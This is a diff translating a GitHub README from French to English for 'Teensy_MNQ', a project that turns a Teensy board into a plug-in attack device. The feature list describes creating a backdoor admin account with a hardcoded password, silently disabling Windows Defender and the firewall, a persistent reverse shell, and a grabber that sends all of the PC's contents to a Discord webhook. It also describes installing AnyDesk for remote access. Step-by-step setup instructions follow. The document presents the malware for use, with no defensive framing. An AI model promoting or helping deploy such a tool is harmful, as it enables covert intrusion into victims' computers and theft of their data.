@@ -1,26 +1,26 @@
 **Teensy_MNQ**
 
-Ce repository contient un programme pour la Teensy ainsi que des configurations et des instructions d'installation pour la manipulation de la carte SD.
+This repository contains a program for Teensy as well as configurations and installation instructions for handling the SD card.
 
-**Fonctionnalités**
+**Features**
 
-- 🔐 Création d'un compte admin avec configuration du mot de passe (NagibAdmin, mot de passe : 12301230)
-- 🛡️ Désactivation discrète et pas à pas de Windows Defender et du Firewall
-- 🔍 Recherche automatique du port auquel l'ordinateur est connecté à la Teensy et retour de force pour la communication bidirectionnelle avec la Teensy
-- ⏳ Persistance : si l'utilisateur n'est pas créé, un délai est ajouté et l'installation reprend depuis le début (rapide)
-- 🔄 Installation d'un reverse shell avec persistance au démarrage
-- 🎣 Installation d'un grabber envoyant tout ce qui est contenu dans le PC vers un webhook Discord
-- 🖥️ Installation de AnyDesk et récupération de l'ID
+- 🔐 Creation of an admin account with password configuration (NagibAdmin, password: 12301230)
+- 🛡️ Discreet and step-by-step deactivation of Windows Defender and Firewall
+- 🔍 Automatic detection of the port to which the computer is connected to the Teensy and feedback for bidirectional communication with the Teensy
+- ⏳ Persistence: if the user is not created, a delay is added, and the installation resumes from the beginning (quick)
+- 🔄 Installation of a reverse shell with startup persistence
+- 🎣 Installation of a grabber sending everything contained in the PC to a Discord webhook
+- 🖥️ Installation of AnyDesk and retrieval of the ID
 
 **Installation**
 
-1. Cloner ce repository sur votre ordinateur :
+1. Clone this repository to your computer:
 
     ```
     git clone https://github.com/Naywvi/Teensy_MNQ.git
     ```
 
-2. Copier-coller le code du fichier .ino dans l'IDE Arduino et téléverser sur la Teensy.
-3. Copier tout le contenu du dossier `Teensy_SD_CARD` sur la carte SD de la Teensy.
+2. Copy and paste the code from the .ino file into the Arduino IDE and upload it to the Teensy.
+3. Copy all the contents of the `Teensy_SD_CARD` folder onto the Teensy's SD card.
 
-C'est tout ! Le programme s'exécutera automatiquement une fois que la Teensy est connectée à un ordinateur.
+That's it! The program will run automatically once the Teensy is connected to a computer.
